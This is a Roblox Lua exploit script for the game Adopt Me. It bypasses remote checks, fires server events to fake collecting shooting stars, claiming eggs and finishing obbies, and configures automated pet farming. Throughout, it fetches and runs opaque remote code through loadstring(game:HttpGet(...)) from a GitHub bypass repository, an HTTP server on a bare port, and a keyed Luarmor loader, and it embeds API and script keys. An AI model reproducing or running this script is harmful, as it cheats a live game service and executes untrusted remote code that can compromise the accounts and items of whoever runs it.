wait(15)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(1)
local locations = {"MainMap", "MoonInterior"}
local args = {}

-- Function to collect stars
local function collectStars(location, isSpecial)
    for i = 1, 100 do
        args[1] = location
        args[2] = tostring(i)
        
        -- If it's a special star, add the third argument
        if isSpecial then
            args[3] = true
        else
            args[3] = nil
        end
        
        game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
        wait(0.2)  -- Delay of 0.2 seconds
    end
end

-- Collect stars for both locations
for _, location in ipairs(locations) do
    collectStars(location, false)  -- Regular stars
    wait(1)  -- Wait 1 second before moving to the next location
    collectStars(location, true)   -- Special stars
    wait(1)  -- Wait 1 second before moving to the next location
end

wait(1)
local args = {
    [1] = "MoonInterior"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ClaimRoyalEgg"):FireServer(unpack(args))
wait(1)
task.spawn(function()
    task.wait(35)
    getgenv().API_KEY = "RukIIrukYPFoGnQUcD7c"
    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
end)

Config = {
    PetFarm = {
        Enabled = true,            -- Master switch for pet farming
        AutoNeon = false,          -- Makes neon pets when you have 4 full grown
        FarmUntilFullyGrown = false, -- true = farms youngest pets | false = oldest pets
        PrioritizeFriendship = true, -- true = highest friendship pets | false = by age only
        FarmEggs = true,           -- Farm eggs until they hatch then buys more
        EggType = "moon_2025_egg",   -- cracked_egg, regular_pet_egg, royal_egg, garden_2024_egg
        SelectFarmEgg = "any",
        BuyEggs = true,           -- Auto buys eggs when needed
        AutoAgePotionEnabled = false,
        AutoAgePotionPets = {"winter_2024_ice_cube","winter_2024_berry_cool_cube"}, -- example of how u use multiple pets
        RarityFarming = {
            Enabled = false, -- enable for rarity farming on wor
            Order = {
                "ultra_rare", -- highest priority 
                "common",
                "legendary",
                "rare",
                "uncommon" -- lowest priority 
            }
        }
    },
    BabyFarm = {
        Enabled = true,           -- Master switch for baby farming
        Priority = "BabyFirst",    -- BabyFirst = do baby tasks first | PetFirst = do pet tasks first
    },
    Webhook = {
        Enabled = true,            -- Enable Discord alerts
        URL = "webhook here",          -- Your webhook
    },
    FPSSaver = {
        Enabled = false,           -- FPS boost mode
        Disable3DRendering = false, -- Max performance
        FPSCap = 10                -- FPS cap 
    },
    UI = {
        Maximized = false,          -- true = big | false = small
        Scale = 1                  -- 0.1 = tiny, 0.5 = half, 1 = full
    }
}

script_key="OkbUgSyCLieCMbeVqgTZOAgbKIdxjRLH"
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8a2399ec22841391ee52540ec7c001e1.lua"))() --Adopt Me Potion Farm / Mass Farming 
wait(600)
local args = {
    [1] = "coastal_climb"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(6005)
local args = {
    [1] = "ancient_ruins"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(12500)
local args = {
    [1] = "lonelypeak"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(25009)
local args = {
    [1] = "miniworld"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(30001)
local args = {
    [1] = "pyramid"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(40505)
local args = {
    [1] = "shipwreck_bay"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(60409)
local args = {
    [1] = "tinyisles"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))



